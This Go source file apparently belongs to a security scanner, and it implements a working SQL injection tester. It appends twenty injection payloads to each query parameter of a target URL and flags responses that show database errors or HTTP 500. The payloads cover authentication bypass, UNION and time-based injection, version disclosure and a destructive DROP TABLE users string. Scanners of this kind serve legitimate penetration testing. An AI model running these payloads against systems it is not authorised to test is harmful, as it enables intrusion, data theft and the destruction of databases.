package native

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

type SQLiResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

func TestSQLi(baseURL string, params map[string]string, concurrency int) []SQLiResult {
	payloads := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"\" OR \"1\"=\"1",
		"1' AND 1=1--",
		"1' AND 1=2--",
		"' UNION SELECT NULL--",
		"' UNION SELECT 1,2,3--",
		"admin'--",
		"admin' OR '1'='1'--",
		"1; DROP TABLE users--",
		"1' ORDER BY 1--",
		"1' ORDER BY 100--",
		"' WAITFOR DELAY '0:0:5'--",
		"1 AND SLEEP(5)",
		"1' AND SLEEP(5)--",
		"' OR pg_sleep(5)--",
		"1' OR '1'='1' /*",
		"1' OR '1'='1' #",
		"admin\"--",
		"1' UNION SELECT @@version--",
	}

	errorPatterns := []string{
		"sql", "mysql", "syntax error", "unclosed quotation",
		"odbc", "driver", "ora-", "microsoft ole db",
		"postgresql", "sqlite", "division by zero",
		"unexpected end of sql", "warning: mysql",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []SQLiResult

	for param, _ := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, v+payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			buf := make([]byte, 2048)
			n, _ := resp.Body.Read(buf)
			resp.Body.Close()
			body := strings.ToLower(string(buf[:n]))

			for _, pat := range errorPatterns {
				if strings.Contains(body, pat) {
					results = append(results, SQLiResult{
						Endpoint:   baseURL,
						Parameter:  param,
						Payload:    payload,
						Vulnerable: true,
						Evidence:   fmt.Sprintf("Error pattern '%s' detected in response", pat),
					})
					break
				}
			}

			if resp.StatusCode == 500 {
				results = append(results, SQLiResult{
					Endpoint:   baseURL,
					Parameter:  param,
					Payload:    payload,
					Vulnerable: true,
					Evidence:   fmt.Sprintf("HTTP 500 Internal Server Error with payload on param %s", param),
				})
			}
		}
	}

	return results
}
